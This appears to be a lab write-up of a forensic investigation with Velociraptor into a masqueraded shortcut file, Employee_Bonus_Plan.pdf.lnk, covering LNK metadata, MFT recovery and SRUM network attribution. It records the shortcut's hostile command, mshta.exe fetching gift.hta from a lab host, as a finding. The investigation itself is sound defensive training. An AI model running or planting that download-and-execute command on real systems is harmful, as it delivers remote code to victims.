Case 3 Continuation: Supplemental Forensic Analysis (Velociraptor)

1. Objective

Validate findings from the Wazuh SIEM analysis by performing deep-dive disk forensics on the infected workstation (Win10), focusing on the malicious .lnk file.

2. Evidence Collection (The "Fetch")

  • Tool: Velociraptor VFS / Artifact Collector.
  • Path: C:\Users\User\Downloads\Employee_Bonus_Plan.pdf.lnk
  • Action:
  1. Navigate to the VFS tab in Velociraptor.
  2. Select file accessor → C: → Users → User → Downloads.
  3. Click "Collect from client" on the target .lnk file.

3. Artifact Analysis: LNK Metadata

Also, we use VQL to pull the embedded "hidden" instructions.

  • Artifact Used: Windows.Forensics.Lnk
  • Parameters: Windows.Forensics.LnkTargetGlob: C:\Users\User\Downloads\Employee_Bonus_Plan.pdf.lnk

Forensic Findings

  • True Target: C:\Windows\System32\mshta.exe
  • Arguments: http://10.10.10.40/gift.hta

4. Cross-Reference with Wazuh

The TargetPath and Arguments extracted by Velociraptor match the data.win.eventdata.commandLine observed in the Wazuh Sysmon logs (from bottom, 3rd rectangle):

Velociraptor also shows timestamps like btime and mtime, allowing for a precise MFT timeline reconstruction.

5. Conclusion

  • Result: Confirmed. The file was a masqueraded shortcut (.lnk) designed to download an HTML Application file (.hta)
  • Status: Findings align 100% with the SIEM analysis.

Exercise 4: MFT Analysis - Recovering Metadata from Deleted Files

Even when a file is permanently deleted (Shift+Del) and the USN Journal entry rotates, the record may still exist in the filesystem’s master index.

  • Artifact: Windows.NTFS.MFT
  • Objective: Locate the metadata of the deleted .lnk file to prove its prior existence, location, and timestamps, even if the content is gone.

(File regex: .*Employee_Bonus_Plan\.pdf\.lnk$)

⇒ Nothing found…

  • Observation: Searches for Employee_Bonus_Plan.pdf.lnk via Windows.NTFS.MFT and even Windows.Forensics.FilenameSearch returned no records, while the parent .zip was successfully identified.
  • Conclusion: This might indicate MFT Record Reuse. Due to the small size of .lnk files (resident attributes) and the high disk I/O of the OS, the MFT index slot was likely overwritten by system processes immediately after the Shift+Delete command.
  • Significance: This highlights the importance of Memory Forensics and USN Journaling, as they often hold the only remaining evidence of short-lived malicious files.

Exercise 5: Network Usage Attribution (SRUM)

After identifying the execution of the malicious .lnk via mshta.exe, we need to confirm if it communicated successfully with the Command & Control (C2) server and if any data was sent/received during the simulation.

  • Artifact: Windows.Forensics.SRUM
  • Objective: Prove that mshta.exe actually had communications and quantify the data sent.
  • Technical Note: The System Resource Usage Monitor (SRUM) records 30–60 days of history for every executable.
  • Observation: Look for mshta.exe in the results.
  • Key Finding: Identify the Bytes Sent/Received. A high volume of "Bytes Sent" from mshta.exe confirms data exfiltration even if the malware was deleted.
